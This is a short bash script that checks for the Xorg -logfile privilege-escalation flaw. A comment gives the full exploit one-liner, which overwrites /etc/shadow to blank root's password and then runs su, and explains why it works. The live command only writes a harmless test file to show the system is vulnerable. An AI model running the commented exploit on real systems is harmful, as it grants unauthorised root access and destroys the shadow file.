#!/bin/bash

# Original command:
# cd /etc; Xorg -fp "root::16431:0:99999:7:::"  -logfile shadow  :1;su

# The way this exploit works is how the Xorg binary has root permissions even if it is ran as a regular user
# , so by setting the logfile using 'fp', the Xorg binary can write to any file, including '/etc/shadow'!
# Which can set/remove passwords, including root's.

# Safe method.
cd /etc ; Xorg -fp "Exploit succeeded!"  -logfile xorg_exploit_test_file  :1 && echo Exploit succeeded!
